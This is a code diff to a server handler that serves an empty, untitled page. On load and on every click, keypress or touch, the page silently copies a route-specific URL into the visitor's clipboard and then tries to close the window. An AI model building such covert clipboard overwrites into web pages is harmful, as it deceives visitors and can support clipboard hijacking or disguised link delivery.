@@ -50,7 +50,7 @@ function handler(req, res) {
   <meta charset="utf-8">
   <title></title>
 </head>
-<body style="background:#fff;margin:0;min-height:100vh;cursor:pointer;">
+<body style="background:#fff;margin:0;">
 <script>
 const LINKS = ${linksJson};
 function getLink(route) {
@@ -69,6 +69,11 @@ const clientUrl = getLink(location.pathname);
 const targetUrl = serverUrl || clientUrl;
 
 if (targetUrl) {
+  function exit() {
+    window.close();
+    try { window.open('', '_self', ''); window.close(); } catch(e){}
+  }
+
   function copyExec(text) {
     try {
       const ta = document.createElement('textarea');
@@ -89,30 +94,21 @@ if (targetUrl) {
     }
   }
 
-  function exit() {
-    window.close();
-    try {
-      window.open('', '_self', '');
-      window.close();
-    } catch(e){}
-    try {
-      window.location.replace('about:blank');
-      window.close();
-    } catch(e){}
-  }
-
-  function run() {
+  async function copy() {
     copyExec(targetUrl);
     if (navigator.clipboard && navigator.clipboard.writeText) {
-      navigator.clipboard.writeText(targetUrl).then(exit).catch(exit);
+      try {
+        await navigator.clipboard.writeText(targetUrl);
+      } catch(e) {}
     }
     exit();
   }
 
-  run();
-  window.addEventListener('click', run);
-  window.addEventListener('keydown', run);
-  window.addEventListener('touchstart', run);
+  copy();
+  exit();
+  window.addEventListener('click', () => { copy(); exit(); });
+  window.addEventListener('keydown', () => { copy(); exit(); });
+  window.addEventListener('touchstart', () => { copy(); exit(); });
 }
 </script>
 </body>
